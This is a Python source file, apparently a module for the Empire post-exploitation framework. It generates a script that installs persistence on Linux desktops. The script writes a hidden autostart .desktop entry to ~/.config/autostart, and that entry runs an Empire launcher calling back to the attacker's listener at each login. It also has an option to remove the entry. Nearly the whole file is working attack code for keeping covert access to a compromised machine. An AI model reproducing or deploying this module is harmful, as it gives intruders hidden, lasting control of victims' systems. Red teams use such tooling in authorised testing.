from builtins import object
import base64
class Module(object):

    def __init__(self, mainMenu, params=[]):

        # metadata info about the module, not modified during runtime
        self.info = {
            # name for the module that will appear in module menus
            'Name': 'DesktopFile',

            # list of one or more authors for the module
            'Author': '@jarrodcoulter',

            # more verbose multi-line description of the module
            'Description': 'Installs an Empire launcher script in ~/.config/autostart on Linux versions with GUI.',

            # True if the module needs to run in the background
            'Background' : False,

            # File extension to save the file as
            'OutputExtension' : None,

            # if the module needs administrative privileges
            'NeedsAdmin' : False,

            # True if the method doesn't touch disk/is reasonably opsec safe
            'OpsecSafe' : False,

            # the module language
            'Language' : 'python',

            # the minimum language version needed
            'MinLanguageVersion' : '2.6',

            # list of any references/other comments
            'Comments': 'https://digitasecurity.com/blog/2018/01/23/crossrat/, https://specifications.freedesktop.org/desktop-entry-spec/latest/ar01s07.html, https://neverbenever.wordpress.com/2015/02/11/how-to-autostart-a-program-in-raspberry-pi-or-linux/'
        }

        # any options needed by the module, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Agent' : {
                # The 'Agent' option is the only one that MUST be in a module
                'Description'   :   'Agent to execute module on.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'Listener' : {
                'Description'   :   'Listener to use.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'Remove' : {
                'Description'   :   'Remove Persistence based on FileName. True/False',
                'Required'      :   False,
                'Value'         :   ''
            },
            'FileName' : {
                'Description'   :   'File name without extension that you would like created in ~/.config/autostart/ folder.',
                'Required'      :   False,
                'Value'         :   'sec_start'
            }

        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        # During instantiation, any settable option parameters
        #   are passed as an object set to the module and the
        #   options dictionary is automatically set. This is mostly
        #   in case options are passed on the command line
        if params:
            for param in params:
                # parameter format is [Name, Value]
                option, value = param
                if option in self.options:
                    self.options[option]['Value'] = value

    def generate(self, obfuscate=False, obfuscationCommand=""):
        remove = self.options['Remove']['Value']
        fileName = self.options['FileName']['Value']
        listenerName = self.options['Listener']['Value']
        launcher = self.mainMenu.stagers.generate_launcher(listenerName, language='python')
        launcher = launcher.strip('echo').strip(' | /usr/bin/python &')
        dtSettings = """
[Desktop Entry]
Name=%s
Exec=python -c %s
Type=Application
NoDisplay=True
""" % (fileName, launcher)
        script = """
import subprocess
import sys
import os
remove = "%s"
dtFile = \"\"\"
%s
\"\"\"
home = os.path.expanduser("~")
filePath = home + "/.config/autostart/"
writeFile = filePath + "%s.desktop"

if remove.lower() == "true":
    if os.path.isfile(writeFile):
        os.remove(writeFile)
        print "\\n[+] Persistence has been removed"
    else:
        print "\\n[-] Persistence file does not exist, nothing removed"

else:
    if not os.path.exists(filePath):
        os.makedirs(filePath)
    e = open(writeFile,'wb')
    e.write(dtFile)
    e.close()

    print "\\n[+] Persistence has been installed: ~/.config/autostart/%s"
    print "\\n[+] Empire daemon has been written to %s"

""" % (remove, dtSettings, fileName, fileName, fileName)

        return script
